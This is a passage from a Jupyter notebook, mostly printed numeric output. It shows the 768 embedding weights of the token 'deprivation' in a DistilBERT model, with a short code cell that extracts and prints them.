      "        -8.5939e-02, -5.9070e-02, -9.9106e-02, -4.0406e-02, -2.5062e-02,\n",
      "        -6.4274e-02, -2.6564e-03, -2.9453e-02, -6.7164e-02, -6.8890e-03,\n",
      "        -6.6717e-02, -4.9404e-02,  9.6970e-03, -5.2334e-02, -7.0816e-02,\n",
      "         1.5775e-02, -3.0747e-02, -9.8514e-03, -4.8192e-02, -3.6755e-02,\n",
      "        -9.7892e-02,  3.0495e-03, -7.5496e-02, -1.2885e-01, -3.6251e-02,\n",
      "        -9.7242e-02, -6.1403e-02,  1.8976e-02, -4.8806e-02, -5.7077e-02,\n",
      "        -1.2645e-01,  1.2036e-01, -2.7044e-02, -3.4522e-02, -1.6116e-01,\n",
      "        -2.3474e-02, -1.0523e-02, -1.4633e-01, -5.8384e-02, -3.1863e-02,\n",
      "        -1.2223e-03, -9.7320e-02,  1.9500e-03, -3.9152e-02, -1.4530e-01,\n",
      "        -2.3403e-02, -1.2162e-02, -3.8652e-02,  5.7159e-02,  5.0773e-02,\n",
      "        -7.5378e-03, -4.0504e-02, -7.8487e-02, -2.3489e-02, -1.0187e-01,\n",
      "        -8.4750e-02, -3.5985e-02, -4.0710e-02, -1.4576e-02, -3.8051e-02,\n",
      "        -1.0730e-01, -7.9320e-02, -1.6052e-01, -5.5413e-02, -1.3200e-01,\n",
      "        -5.8279e-02, -7.1735e-02, -4.4349e-02, -8.7700e-02,  1.0983e-01,\n",
      "        -8.3116e-02, -3.7331e-02, -9.7011e-02, -7.1977e-02, -5.1567e-02,\n",
      "        -2.6677e-02, -2.9932e-02, -1.1158e-01,  9.5170e-02, -6.0444e-02,\n",
      "        -3.7260e-02,  3.9643e-03, -8.4034e-02, -3.3838e-02, -8.2960e-02,\n",
      "         6.7119e-02, -4.8409e-02,  2.3193e-02, -1.0241e-01, -2.8123e-02,\n",
      "        -2.3449e-02, -6.0878e-02, -1.0694e-01, -5.7558e-02,  1.6036e-02,\n",
      "        -1.7853e-02, -1.4072e-02, -1.3007e-02, -2.9395e-02, -3.0835e-02,\n",
      "        -3.3361e-02, -3.1679e-02, -8.9562e-03, -4.1214e-02, -2.4375e-02,\n",
      "        -4.6580e-02, -1.1979e-03, -7.7472e-02, -4.6665e-02, -7.1575e-02,\n",
      "        -3.2002e-02, -4.8464e-02,  4.3928e-02, -4.3085e-02, -3.1030e-02,\n",
      "        -1.2707e-02, -1.2190e-01,  3.0832e-02,  2.6051e-05, -3.0375e-02,\n",
      "         2.6575e-02, -5.5703e-02,  3.8038e-02, -1.3217e-01, -3.9240e-02,\n",
      "         9.0294e-02, -3.7312e-02, -4.5569e-02,  3.2224e-02, -1.0256e-01,\n",
      "        -3.2605e-02, -8.3530e-02, -7.0601e-02, -8.8956e-02, -4.0625e-02,\n",
      "        -5.5234e-02, -1.3389e-01, -4.2069e-02, -5.3717e-02, -9.1943e-02,\n",
      "        -9.1382e-02, -1.0839e-01, -1.0277e-01, -6.8429e-02, -5.5001e-02,\n",
      "        -1.6048e-02, -3.1761e-02, -1.7824e-03,  3.1349e-02, -3.2275e-02,\n",
      "        -1.6730e-01, -1.1502e-01, -4.5391e-02, -6.3204e-02, -3.7920e-02,\n",
      "         1.3583e-02, -3.0112e-02, -3.1900e-02,  9.2101e-02, -9.6307e-02,\n",
      "        -6.6096e-02,  4.8234e-03, -5.5400e-03, -3.4528e-02,  4.6329e-02,\n",
      "        -7.2873e-03, -1.0255e-01, -2.1396e-02, -9.4689e-02,  9.9484e-03,\n",
      "        -4.2110e-02, -2.8904e-02, -5.9645e-02, -5.2823e-02, -1.2926e-03,\n",
      "        -6.2376e-02, -7.0391e-02, -6.7165e-02, -2.5257e-02, -7.1436e-02,\n",
      "        -5.9949e-02, -6.9161e-02, -4.3920e-02,  4.0938e-02,  2.6382e-02,\n",
      "        -8.4162e-02, -2.0388e-02, -1.0875e-01, -3.2847e-02,  1.5447e-02,\n",
      "        -4.2625e-02,  4.6786e-03, -1.2023e-01,  6.1826e-02,  3.5939e-02,\n",
      "        -1.3929e-01, -1.2240e-01, -2.9017e-02, -9.0200e-03, -8.6847e-02,\n",
      "        -1.6362e-02,  7.2085e-02, -6.9269e-02,  2.7417e-03, -5.8948e-02,\n",
      "        -8.1403e-02,  8.0712e-02, -3.3437e-02, -1.1806e-01, -7.2961e-02,\n",
      "        -9.0310e-02, -3.9054e-02, -9.3163e-03, -5.6677e-02, -1.0545e-01,\n",
      "        -1.6851e-02, -1.0786e-01,  5.4900e-02,  7.2699e-02, -1.0585e-01,\n",
      "        -7.9297e-02,  1.0774e-01, -6.1447e-03, -4.0108e-02, -8.3633e-02,\n",
      "        -1.3297e-01, -4.9623e-02, -2.9096e-02, -7.0705e-02,  1.2452e-01,\n",
      "        -7.2260e-02, -5.2626e-02, -8.4445e-02, -4.3682e-03, -1.2321e-01,\n",
      "        -4.8552e-02, -7.0424e-02,  5.8278e-03, -7.6411e-02, -3.5712e-02,\n",
      "        -5.0485e-02, -3.6666e-02, -7.2994e-02, -8.7987e-02, -5.8043e-02,\n",
      "        -9.0658e-02,  1.1783e-02, -1.1359e-01, -2.5415e-02, -2.3709e-02,\n",
      "         4.2708e-02, -5.6626e-02, -1.6384e-02, -3.0306e-02,  6.9639e-02,\n",
      "         5.9663e-02, -1.1823e-01, -5.5574e-02,  1.8335e-02, -3.1618e-02,\n",
      "        -7.0384e-02, -1.1199e-01, -1.3269e-01,  8.9556e-02, -1.3338e-01,\n",
      "        -1.4450e-02, -1.8802e-02, -7.2850e-02, -1.0199e-01, -7.7970e-02,\n",
      "         3.5827e-03, -4.2095e-02, -7.9221e-02, -4.2125e-02, -1.3304e-02,\n",
      "        -8.1066e-02, -1.0984e-01, -7.0756e-04, -7.3461e-02, -9.9542e-02,\n",
      "        -1.7901e-02, -1.2994e-01,  2.0095e-02, -3.8462e-02, -1.0643e-01,\n",
      "        -6.8670e-02, -1.0401e-01, -7.1281e-02, -7.0032e-02, -7.0894e-02,\n",
      "        -4.3491e-02, -3.1033e-02, -7.9731e-02, -6.9657e-02, -5.7293e-02,\n",
      "         8.2556e-03, -4.7823e-02, -6.5772e-02,  1.6629e-02, -1.0804e-01,\n",
      "        -4.0280e-02, -8.6629e-02, -9.3717e-02, -6.3695e-02, -9.9662e-02,\n",
      "        -3.2203e-02, -6.6593e-02,  2.0720e-02, -8.3451e-02, -2.4776e-02,\n",
      "        -9.3228e-02, -1.3778e-01, -5.2345e-02, -1.7196e-02, -4.1415e-02,\n",
      "        -8.4365e-02, -6.1519e-02, -3.1080e-02, -3.9682e-02, -1.9870e-02,\n",
      "        -8.4297e-02,  1.7241e-03, -2.5701e-02, -7.5547e-02, -1.0977e-01,\n",
      "         1.2543e-02, -6.4754e-02, -6.0083e-02, -4.2418e-02, -5.5593e-02,\n",
      "         1.0310e-02, -3.7842e-02, -6.1564e-02, -1.5142e-01, -4.9342e-02,\n",
      "        -5.5603e-02,  9.8081e-05, -7.4147e-02, -1.4195e-02, -1.3792e-01,\n",
      "        -1.4810e-02, -1.5159e-02, -9.1933e-02, -2.2942e-02,  2.0656e-02,\n",
      "        -4.4939e-02, -2.2641e-02, -7.1985e-02, -8.3594e-02,  2.3015e-02,\n",
      "        -7.6942e-02, -3.7448e-02, -7.9955e-02,  8.9971e-02, -6.5198e-02,\n",
      "        -4.3593e-02, -4.7861e-02, -1.1859e-01, -1.0392e-01, -3.0815e-02,\n",
      "        -1.9759e-02, -3.4579e-02, -4.7792e-02, -8.7647e-02,  4.8401e-02,\n",
      "        -5.5621e-02, -5.9186e-02,  1.3558e-03, -7.9614e-02, -1.0989e-01,\n",
      "        -1.1686e-01, -1.6162e-02, -8.7791e-02, -9.3163e-02, -1.0855e-01,\n",
      "        -3.5620e-02, -6.5212e-02, -5.1006e-02, -4.5010e-02, -4.8355e-02,\n",
      "        -6.0336e-02, -8.4105e-02, -6.6779e-02, -2.6154e-02, -7.9395e-02,\n",
      "        -1.2863e-02, -5.4095e-02, -2.8160e-02, -4.4549e-02,  3.0935e-03,\n",
      "        -5.0968e-02, -6.9740e-03,  7.4804e-02, -1.8526e-02, -6.9111e-02,\n",
      "         4.2716e-02, -1.0459e-01, -1.0456e-01, -6.1928e-02, -5.0594e-02,\n",
      "        -5.6420e-02, -1.5895e-01,  8.4685e-04, -6.7928e-02, -2.8748e-02,\n",
      "         3.0604e-02,  1.6196e-02, -6.4199e-02, -1.3192e-01, -5.3156e-02,\n",
      "         1.6363e-02, -6.3657e-02, -1.4826e-01, -5.0824e-02, -1.5024e-01,\n",
      "        -9.3542e-02, -7.2668e-02, -8.1347e-02,  4.7289e-03, -5.7823e-02,\n",
      "        -3.9344e-02, -9.0453e-02, -7.7964e-03, -2.7922e-03, -9.9342e-02,\n",
      "         1.2097e-02, -2.3490e-02,  4.8888e-02, -6.6565e-02, -1.1669e-02,\n",
      "        -4.3247e-02, -7.6094e-02, -9.6269e-02, -6.8241e-02, -2.0985e-02,\n",
      "        -7.6115e-02, -5.1567e-02, -9.0851e-02,  3.7932e-03,  1.4200e-01,\n",
      "        -6.5977e-02, -5.6830e-02, -8.2516e-02, -6.4228e-02, -2.1138e-02,\n",
      "         3.0913e-02,  2.0114e-02, -3.8947e-02, -8.7574e-02,  2.1158e-02,\n",
      "        -8.9774e-02,  7.6656e-02,  7.6514e-03, -5.7873e-02,  8.0128e-02,\n",
      "         6.3197e-02, -5.7249e-02, -7.2208e-02, -2.0858e-03, -9.7944e-02,\n",
      "        -3.1504e-02, -2.9842e-03, -7.2526e-02,  2.1126e-02, -2.5966e-02,\n",
      "        -5.7569e-02,  2.1132e-03, -7.4770e-02, -3.3849e-02, -2.8167e-04,\n",
      "        -8.6680e-02, -6.6830e-02, -4.3913e-02, -3.2290e-03,  4.5841e-02,\n",
      "        -7.2523e-02, -5.9905e-02, -1.1718e-01, -6.0315e-02,  6.5779e-03,\n",
      "        -1.7255e-02,  2.4779e-03, -7.9459e-03, -1.6355e-02, -9.0451e-02,\n",
      "        -5.4740e-02, -3.2760e-02,  2.5913e-02, -2.8663e-02,  7.0957e-03,\n",
      "         5.5650e-02, -6.9274e-02,  6.6113e-02, -6.6853e-02, -4.4239e-02,\n",
      "        -9.5255e-03, -3.8320e-02, -4.1004e-02, -2.2793e-02, -5.0546e-02,\n",
      "        -3.0683e-02, -1.0114e-01, -8.7564e-02, -5.5302e-02, -5.7743e-02,\n",
      "        -3.9030e-02, -3.0202e-02, -1.1002e-01,  9.4746e-03, -9.4960e-02,\n",
      "        -9.6550e-02, -3.0751e-02, -4.9299e-02,  6.3270e-03, -6.9791e-02,\n",
      "        -4.8841e-02, -5.7988e-03, -8.9497e-02, -3.0724e-02, -5.3207e-02,\n",
      "        -9.7170e-02, -1.9755e-02, -3.1587e-02, -7.1489e-04,  5.1651e-02,\n",
      "        -1.0074e-03, -5.9348e-03, -9.4742e-02, -3.5220e-02,  3.3296e-03,\n",
      "        -9.8400e-03, -3.5836e-02, -7.1552e-02, -5.3823e-02,  3.5715e-02,\n",
      "        -8.5792e-02, -1.1458e-01, -9.0106e-02, -1.2200e-01, -3.2978e-02,\n",
      "        -1.0995e-01, -2.1813e-02, -6.2197e-02, -8.0113e-02, -4.1665e-02,\n",
      "        -8.7942e-02,  4.2238e-02, -1.1402e-02, -5.4414e-02, -8.1709e-02,\n",
      "        -2.1410e-02, -8.4200e-03, -6.7933e-03, -1.0497e-01, -8.2506e-02,\n",
      "        -1.3981e-02, -7.1268e-02, -5.3065e-02, -5.9033e-02, -2.9928e-02,\n",
      "        -7.9689e-02, -3.9563e-02, -5.7712e-02, -7.5729e-02, -6.5589e-03,\n",
      "        -3.6994e-02, -4.8342e-02, -5.3799e-02,  8.4284e-03, -2.8661e-02,\n",
      "        -2.2143e-02, -7.9274e-02, -1.3128e-01, -4.6929e-02, -1.0230e-01,\n",
      "        -3.5191e-02,  1.6153e-02, -8.2159e-02, -8.8296e-02, -5.4576e-02,\n",
      "         5.8142e-02, -5.5314e-02, -7.4150e-02,  5.8800e-02, -1.6857e-02,\n",
      "        -1.5688e-01,  1.3466e-02,  6.7653e-03, -7.7555e-03, -3.8528e-02,\n",
      "        -9.7064e-02, -8.1302e-03, -6.0571e-02, -1.0202e-02, -1.9625e-02,\n",
      "        -8.4056e-02, -6.0825e-02, -4.9921e-02, -1.0999e-01,  3.9329e-03,\n",
      "        -8.6187e-02, -4.0648e-02,  4.4221e-02,  2.4888e-03, -3.2614e-02,\n",
      "        -3.6393e-02, -8.8022e-02, -4.9765e-02, -1.0701e-01,  8.2059e-02,\n",
      "         1.5927e-02, -1.5798e-02, -5.7284e-02, -5.9634e-02, -2.7528e-02,\n",
      "        -8.5209e-02,  1.2046e-02, -3.7307e-02, -4.7334e-02, -5.5671e-02,\n",
      "        -7.3951e-02, -9.8191e-02, -6.8336e-02, -1.0103e-01, -6.8377e-02,\n",
      "        -2.9175e-02, -3.8573e-02, -4.4089e-02, -4.1272e-03, -4.7696e-02,\n",
      "        -1.7850e-02, -8.2142e-02,  3.1293e-02, -4.8752e-02, -6.2557e-02,\n",
      "        -2.1539e-02, -1.6586e-02, -1.2110e-01, -7.5086e-02, -1.0322e-01,\n",
      "        -7.6112e-02, -9.1563e-02, -1.1173e-01, -7.3463e-02, -1.0092e-01,\n",
      "         1.7315e-02, -9.9422e-02, -9.2297e-02, -1.9834e-03, -6.8662e-02,\n",
      "        -8.3838e-02, -1.1453e-01, -5.0761e-02, -5.4329e-02, -1.9662e-02,\n",
      "        -6.5713e-02, -3.8401e-02, -5.3857e-02, -4.8775e-02,  2.2606e-02,\n",
      "        -4.1275e-02, -1.2685e-01, -1.0260e-01, -7.8854e-03, -5.2105e-02,\n",
      "         2.2971e-02, -5.3903e-02, -1.6148e-01, -1.3842e-01, -6.2178e-02,\n",
      "        -5.0563e-02, -9.1466e-02, -8.4083e-02, -3.8347e-02, -2.7138e-02,\n",
      "        -1.1629e-01, -6.7318e-02, -9.8814e-02], requires_grad=True)\n",
      "Total amount of parameters per neuron: 768\n",
      "Float-Nr on 4'th index in tensor: -0.05574268102645874\n"
     ]
    }
   ],
   "source": [
    "# With this we identify the id of the word \"deprivation\" in the tokenizer of the\n",
    "# model, and extract the weights associated with it. We also give an example of\n",
    "# one of the weights, which really is just a float. Amazing huh, that such a\n",
    "# simple number is behind this AI-craze!\n",
    "def print_tensor_precision(id_weights):\n",
    "    print(f\"actual weights in the token: {id_weights}\")\n",
    "    print(f\"Total amount of parameters per neuron: {len(id_weights)}\")\n",
    "    print(f\"Float-Nr on 4'th index in tensor: {id_weights[4].item()}\")\n",
    "\n",
    "with torch.no_grad():\n",
    "    t_id = tokenizer.convert_tokens_to_ids(\"deprivation\")\n",
    "    t_weights = t_model.distilbert.embeddings.word_embeddings.weight[t_id]\n",
    "    print_tensor_precision(t_weights)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([-8.59442949e-02, -4.53085899e-02, -3.76196168e-02, -5.85689768e-02,\n",
       "       -5.57426810e-02, -7.83000663e-02, -7.50662386e-02,  3.94254401e-02,\n",
       "       -9.32191610e-02, -1.23248033e-01, -3.61448750e-02, -2.40243841e-02,\n",
       "        1.12677244e-02, -2.56582275e-02, -6.96946867e-04, -4.94517684e-02,\n",
       "       -3.34425867e-02, -1.31352484e-01, -1.05619892e-01,  4.94754128e-03,\n",
       "        1.81422178e-02,  2.65466347e-02, -2.73013371e-04,  2.56991517e-02,\n",
       "       -5.87402582e-02, -1.90112218e-02, -2.79811434e-02, -1.29030555e-01,\n",
       "       -5.10836020e-02, -1.28117993e-01, -4.91757132e-03, -7.61236772e-02,\n",
       "       -1.80945545e-02, -2.39540972e-02, -6.38109371e-02, -1.38460502e-01,\n",
       "       -6.62053078e-02,  5.79247577e-03, -1.24700986e-01, -1.25610247e-01,\n",
       "       -8.39905515e-02, -8.44589025e-02, -8.15731212e-02, -2.72332896e-02,\n",
       "       -5.58302738e-02, -3.40109617e-02, -7.70635530e-02, -1.25344396e-01,\n",
       "       -8.70074406e-02, -1.01803005e-01, -6.12310618e-02,  8.61186683e-02,\n",
       "       -1.44932782e-02,  6.01624027e-02, -2.45098248e-02, -1.21360444e-01,\n",
       "        1.02025562e-03, -2.69640666e-02,  1.90190896e-02, -1.40505591e-02,\n",
       "        4.18776833e-02, -1.13959141e-01,  3.86503823e-02, -5.85795417e-02,\n",
       "        3.75316874e-03, -7.79960454e-02, -3.49575989e-02,  1.13472575e-02,\n",
       "       -4.40248242e-03, -7.28820637e-02, -1.25709623e-01, -7.75583610e-02,\n",
       "       -8.18140656e-02, -1.82819851e-02, -1.11713894e-01, -2.98447832e-02,\n",
       "       -5.68028465e-02, -4.23916355e-02, -1.27039939e-01, -1.22151035e-03,\n",
       "       -2.89251022e-02, -1.05474247e-02, -4.71826792e-02, -5.87827638e-02,\n",
       "       -1.00342155e-01, -9.33462903e-02,  1.33374119e-02, -5.28810658e-02,\n",
       "       -5.94003610e-02, -1.91232916e-02, -8.59386176e-02, -5.90695664e-02,\n",
       "       -9.91055220e-02, -4.04061638e-02, -2.50624157e-02, -6.42741770e-02,\n",
       "       -2.65640789e-03, -2.94528343e-02, -6.71644062e-02, -6.88896608e-03,\n",
       "       -6.67166337e-02, -4.94041070e-02,  9.69702378e-03, -5.23344986e-02,\n",
       "       -7.08162040e-02,  1.57750025e-02, -3.07466090e-02, -9.85140353e-03,\n",
       "       -4.81923223e-02, -3.67547236e-02, -9.78924707e-02,  3.04950308e-03,\n",
       "       -7.54962713e-02, -1.28848180e-01, -3.62505130e-02, -9.72418189e-02,\n",
       "       -6.14030138e-02,  1.89759638e-02, -4.88059558e-02, -5.70767671e-02,\n",
       "       -1.26454085e-01,  1.20355122e-01, -2.70438530e-02, -3.45220678e-02,\n",
       "       -1.61159545e-01, -2.34737210e-02, -1.05233416e-02, -1.46332100e-01,\n",
       "       -5.83837256e-02, -3.18630114e-02, -1.22225366e-03, -9.73201394e-02,\n",
       "        1.94999727e-03, -3.91524807e-02, -1.45297289e-01, -2.34029964e-02,\n",
       "       -1.21623268e-02, -3.86520550e-02,  5.71593270e-02,  5.07733524e-02,\n",
       "       -7.53782922e-03, -4.05035987e-02, -7.84870759e-02, -2.34890543e-02,\n",
       "       -1.01870149e-01, -8.47499222e-02, -3.59849259e-02, -4.07096557e-02,\n",
       "       -1.45761790e-02, -3.80512774e-02, -1.07304163e-01, -7.93203115e-02,\n",
       "       -1.60516188e-01, -5.54127581e-02, -1.32001787e-01, -5.82791679e-02,\n",
       "       -7.17350915e-02, -4.43492904e-02, -8.76997411e-02,  1.09828740e-01,\n",
       "       -8.31158832e-02, -3.73312645e-02, -9.70114097e-02, -7.19772577e-02,\n",
       "       -5.15673868e-02, -2.66767889e-02, -2.99322400e-02, -1.11581326e-01,\n",
       "        9.51704010e-02, -6.04439452e-02, -3.72601822e-02,  3.96431657e-03,\n",
       "       -8.40344578e-02, -3.38377282e-02, -8.29597339e-02,  6.71194568e-02,\n",
       "       -4.84092049e-02,  2.31926236e-02, -1.02414757e-01, -2.81231403e-02,\n",
       "       -2.34490689e-02, -6.08784109e-02, -1.06942877e-01, -5.75582646e-02,\n",
       "        1.60364453e-02, -1.78530402e-02, -1.40718250e-02, -1.30074099e-02,\n",
       "       -2.93951295e-02, -3.08353510e-02, -3.33612263e-02, -3.16791497e-02,\n",
       "       -8.95617064e-03, -4.12136205e-02, -2.43751109e-02, -4.65795845e-02,\n",
       "       -1.19786325e-03, -7.74723142e-02, -4.66646776e-02, -7.15751424e-02,\n",
       "       -3.20019834e-02, -4.84638847e-02,  4.39275280e-02, -4.30845171e-02,\n",
       "       -3.10295857e-02, -1.27071934e-02, -1.21897921e-01,  3.08321230e-02,\n",
       "        2.60510533e-05, -3.03753167e-02,  2.65747663e-02, -5.57031892e-02,\n",
       "        3.80381383e-02, -1.32170811e-01, -3.92397419e-02,  9.02937278e-02,\n",
       "       -3.73121835e-02, -4.55687307e-02,  3.22237127e-02, -1.02558695e-01,\n",
       "       -3.26054916e-02, -8.35301280e-02, -7.06014931e-02, -8.89559984e-02,\n",
       "       -4.06251214e-02, -5.52342199e-02, -1.33893728e-01, -4.20685671e-02,\n",
       "       -5.37168421e-02, -9.19429585e-02, -9.13816914e-02, -1.08386867e-01,\n",
       "       -1.02772765e-01, -6.84292391e-02, -5.50011732e-02, -1.60478037e-02,\n",
       "       -3.17612737e-02, -1.78241183e-03,  3.13485600e-02, -3.22745033e-02,\n",
       "       -1.67300180e-01, -1.15021117e-01, -4.53909971e-02, -6.32041991e-02,\n",
       "       -3.79204787e-02,  1.35834040e-02, -3.01124174e-02, -3.19000334e-02,\n",
       "        9.21014920e-02, -9.63070616e-02, -6.60958812e-02,  4.82344115e-03,\n",
       "       -5.54003101e-03, -3.45278122e-02,  4.63293903e-02, -7.28729786e-03,\n",
       "       -1.02547459e-01, -2.13960800e-02, -9.46885422e-02,  9.94837284e-03,\n",
       "       -4.21100892e-02, -2.89041046e-02, -5.96447140e-02, -5.28230593e-02,\n",
       "       -1.29259354e-03, -6.23761602e-02, -7.03914538e-02, -6.71652257e-02,\n",
       "       -2.52567753e-02, -7.14359879e-02, -5.99492751e-02, -6.91605359e-02,\n",
       "       -4.39199284e-02,  4.09384109e-02,  2.63816360e-02, -8.41622502e-02,\n",
       "       -2.03883853e-02, -1.08747452e-01, -3.28471363e-02,  1.54472077e-02,\n",
       "       -4.26254757e-02,  4.67857812e-03, -1.20230794e-01,  6.18261248e-02,\n",
       "        3.59394811e-02, -1.39293402e-01, -1.22399978e-01, -2.90167294e-02,\n",
       "       -9.01998766e-03, -8.68473724e-02, -1.63620524e-02,  7.20852315e-02,\n",
       "       -6.92694932e-02,  2.74166418e-03, -5.89477867e-02, -8.14027488e-02,\n",
       "        8.07121396e-02, -3.34372558e-02, -1.18061423e-01, -7.29605705e-02,\n",
       "       -9.03104544e-02, -3.90537567e-02, -9.31627210e-03, -5.66766597e-02,\n",
       "       -1.05446719e-01, -1.68506876e-02, -1.07862368e-01,  5.48996478e-02,\n",
       "        7.26994574e-02, -1.05851613e-01, -7.92966858e-02,  1.07737184e-01,\n",
       "       -6.14465214e-03, -4.01077345e-02, -8.36330205e-02, -1.32974237e-01,\n",
       "       -4.96225320e-02, -2.90963147e-02, -7.07047582e-02,  1.24515526e-01,\n",
       "       -7.22602755e-02, -5.26261367e-02, -8.44453722e-02, -4.36816271e-03,\n",
       "       -1.23211510e-01, -4.85520251e-02, -7.04240128e-02,  5.82784461e-03,\n",
       "       -7.64106438e-02, -3.57121155e-02, -5.04851975e-02, -3.66657525e-02,\n",
       "       -7.29937479e-02, -8.79871100e-02, -5.80434464e-02, -9.06577185e-02,\n",
       "        1.17828017e-02, -1.13589190e-01, -2.54153907e-02, -2.37091202e-02,\n",
       "        4.27082181e-02, -5.66256456e-02, -1.63838994e-02, -3.03056668e-02,\n",
       "        6.96389154e-02,  5.96628524e-02, -1.18230566e-01, -5.55739142e-02,\n",
       "        1.83350090e-02, -3.16181146e-02, -7.03837052e-02, -1.11994676e-01,\n",
       "       -1.32691398e-01,  8.95563811e-02, -1.33380130e-01, -1.44501859e-02,\n",
       "       -1.88015085e-02, -7.28499889e-02, -1.01989768e-01, -7.79701248e-02,\n",
       "        3.58272158e-03, -4.20953035e-02, -7.92214572e-02, -4.21249904e-02,\n",
       "       -1.33043239e-02, -8.10664296e-02, -1.09839179e-01, -7.07558065e-04,\n",
       "       -7.34607652e-02, -9.95421708e-02, -1.79008488e-02, -1.29941881e-01,\n",
       "        2.00952236e-02, -3.84619087e-02, -1.06431924e-01, -6.86698630e-02,\n",
       "       -1.04012080e-01, -7.12807626e-02, -7.00315088e-02, -7.08938688e-02,\n",
       "       -4.34913635e-02, -3.10329664e-02, -7.97310248e-02, -6.96573332e-02,\n",
       "       -5.72928302e-02,  8.25563353e-03, -4.78232354e-02, -6.57721907e-02,\n",
       "        1.66285206e-02, -1.08039677e-01, -4.02799882e-02, -8.66291299e-02,\n",
       "       -9.37174335e-02, -6.36946782e-02, -9.96621698e-02, -3.22025530e-02,\n",
       "       -6.65929466e-02,  2.07195412e-02, -8.34510252e-02, -2.47755237e-02,\n",
       "       -9.32280049e-02, -1.37775168e-01, -5.23448959e-02, -1.71963442e-02,\n",
       "       -4.14148755e-02, -8.43648314e-02, -6.15185425e-02, -3.10802441e-02,\n",
       "       -3.96817438e-02, -1.98697317e-02, -8.42973813e-02,  1.72410603e-03,\n",
       "       -2.57011000e-02, -7.55465850e-02, -1.09768704e-01,  1.25430636e-02,\n",
       "       -6.47540689e-02, -6.00830540e-02, -4.24180217e-02, -5.55928759e-02,\n",
       "        1.03096748e-02, -3.78420018e-02, -6.15636185e-02, -1.51415914e-01,\n",
       "       -4.93421815e-02, -5.56034781e-02,  9.80807599e-05, -7.41465166e-02,\n",
       "       -1.41950212e-02, -1.37919724e-01, -1.48103973e-02, -1.51593052e-02,\n",
       "       -9.19332877e-02, -2.29415242e-02,  2.06563361e-02, -4.49390411e-02,\n",
       "       -2.26408783e-02, -7.19849244e-02, -8.35943222e-02,  2.30148938e-02,\n",
       "       -7.69416615e-02, -3.74475978e-02, -7.99548998e-02,  8.99713561e-02,\n",
       "       -6.51982203e-02, -4.35925797e-02, -4.78614643e-02, -1.18588947e-01,\n",
       "       -1.03920847e-01, -3.08146235e-02, -1.97588950e-02, -3.45790163e-02,\n",
       "       -4.77919728e-02, -8.76465067e-02,  4.84008342e-02, -5.56209311e-02,\n",
       "       -5.91857657e-02,  1.35577540e-03, -7.96139315e-02, -1.09894261e-01,\n",
       "       -1.16858348e-01, -1.61619987e-02, -8.77909139e-02, -9.31633711e-02,\n",
       "       -1.08549461e-01, -3.56201157e-02, -6.52121231e-02, -5.10062613e-02,\n",
       "       -4.50102985e-02, -4.83553931e-02, -6.03362471e-02, -8.41051489e-02,\n",
       "       -6.67788982e-02, -2.61537898e-02, -7.93950781e-02, -1.28629850e-02,\n",
       "       -5.40946759e-02, -2.81600244e-02, -4.45494466e-02,  3.09348083e-03,\n",
       "       -5.09677827e-02, -6.97403029e-03,  7.48038590e-02, -1.85257010e-02,\n",
       "       -6.91105127e-02,  4.27158251e-02, -1.04589164e-01, -1.04557738e-01,\n",
       "       -6.19276688e-02, -5.05943261e-02, -5.64204864e-02, -1.58947185e-01,\n",
       "        8.46845389e-04, -6.79282174e-02, -2.87482515e-02,  3.06037683e-02,\n",
       "        1.61960702e-02, -6.41987100e-02, -1.31922692e-01, -5.31555936e-02,\n",
       "        1.63630657e-02, -6.36566132e-02, -1.48263708e-01, -5.08235805e-02,\n",
       "       -1.50239348e-01, -9.35417935e-02, -7.26683661e-02, -8.13465714e-02,\n",
       "        4.72891983e-03, -5.78234717e-02, -3.93441431e-02, -9.04534385e-02,\n",
       "       -7.79641420e-03, -2.79221311e-03, -9.93418843e-02,  1.20966639e-02,\n",
       "       -2.34896466e-02,  4.88880873e-02, -6.65650219e-02, -1.16694225e-02,\n",
       "       -4.32471111e-02, -7.60935992e-02, -9.62691009e-02, -6.82413578e-02,\n",
       "       -2.09849570e-02, -7.61145502e-02, -5.15666120e-02, -9.08512548e-02,\n",
       "        3.79322027e-03,  1.41998336e-01, -6.59769624e-02, -5.68302497e-02,\n",
       "       -8.25161114e-02, -6.42283484e-02, -2.11375114e-02,  3.09125148e-02,\n",
       "        2.01137252e-02, -3.89466695e-02, -8.75740349e-02,  2.11583339e-02,\n",
       "       -8.97735283e-02,  7.66560659e-02,  7.65135698e-03, -5.78729473e-02,\n",
       "        8.01277831e-02,  6.31966367e-02, -5.72486147e-02, -7.22080097e-02,\n",
       "       -2.08575022e-03, -9.79437679e-02, -3.15040685e-02, -2.98417034e-03,\n",
       "       -7.25256130e-02,  2.11255420e-02, -2.59663016e-02, -5.75686730e-02,\n",
       "        2.11324380e-03, -7.47695938e-02, -3.38490605e-02, -2.81665300e-04,\n",
       "       -8.66798982e-02, -6.68299124e-02, -4.39134017e-02, -3.22896987e-03,\n",
       "        4.58409674e-02, -7.25230053e-02, -5.99045344e-02, -1.17178828e-01,\n",
       "       -6.03146255e-02,  6.57792715e-03, -1.72548201e-02,  2.47791177e-03,\n",
       "       -7.94590358e-03, -1.63549781e-02, -9.04513076e-02, -5.47403172e-02,\n",
       "       -3.27595882e-02,  2.59126555e-02, -2.86625456e-02,  7.09574670e-03,\n",
       "        5.56501225e-02, -6.92739040e-02,  6.61128163e-02, -6.68525621e-02,\n",
       "       -4.42392565e-02, -9.52551141e-03, -3.83196287e-02, -4.10036966e-02,\n",
       "       -2.27926522e-02, -5.05459234e-02, -3.06832884e-02, -1.01135582e-01,\n",
       "       -8.75635967e-02, -5.53015023e-02, -5.77432476e-02, -3.90302688e-02,\n",
       "       -3.02022435e-02, -1.10023446e-01,  9.47462115e-03, -9.49601680e-02,\n",
       "       -9.65495035e-02, -3.07508949e-02, -4.92994338e-02,  6.32704003e-03,\n",
       "       -6.97914362e-02, -4.88414615e-02, -5.79878874e-03, -8.94970372e-02,\n",
       "       -3.07242498e-02, -5.32072224e-02, -9.71697047e-02, -1.97550375e-02,\n",
       "       -3.15870903e-02, -7.14891939e-04,  5.16505949e-02, -1.00737414e-03,\n",
       "       -5.93478046e-03, -9.47423652e-02, -3.52198407e-02,  3.32957623e-03,\n",
       "       -9.84004978e-03, -3.58362906e-02, -7.15522170e-02, -5.38228266e-02,\n",
       "        3.57145146e-02, -8.57920274e-02, -1.14575170e-01, -9.01062489e-02,\n",
       "       -1.22002795e-01, -3.29778418e-02, -1.09949782e-01, -2.18128655e-02,\n",
       "       -6.21972270e-02, -8.01127255e-02, -4.16647159e-02, -8.79421011e-02,\n",
